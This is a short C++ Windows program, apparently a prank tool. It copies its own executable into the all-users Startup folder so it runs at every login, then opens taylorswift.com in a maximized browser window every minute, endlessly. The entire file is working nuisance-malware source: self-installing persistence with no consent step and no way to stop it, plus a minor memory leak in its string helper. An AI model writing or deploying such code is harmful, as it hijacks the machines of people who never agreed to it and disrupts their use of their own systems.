#include <Windows.h>

#include <Shellapi.h>
#include <Lmcons.h>

#pragma comment (lib, "Shell32")

constexpr auto INTERVAL_MS = 60000;
constexpr auto URL = L"http://www.taylorswift.com";
constexpr auto STARTUP_PATH = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\swifted.exe";
constexpr auto MAX_CHAR_LENGTH = 4096;

// Convert a char[] to LPCWSTR
wchar_t* ToLPCWSTR(const char * charArray)
{
	wchar_t * wString = new wchar_t[MAX_CHAR_LENGTH];

	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, MAX_CHAR_LENGTH);

	return wString;
}

// Make a copy of the program to the startup
void CopySelf() {
	char filename[MAX_PATH];

	GetModuleFileNameA(NULL, filename, MAX_PATH);

	CopyFile(ToLPCWSTR(filename), STARTUP_PATH, 0);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	CopySelf();

	while (true) {
		ShellExecute(NULL, L"open", URL, NULL, NULL, SW_SHOWMAXIMIZED);

		Sleep(INTERVAL_MS);
	}
}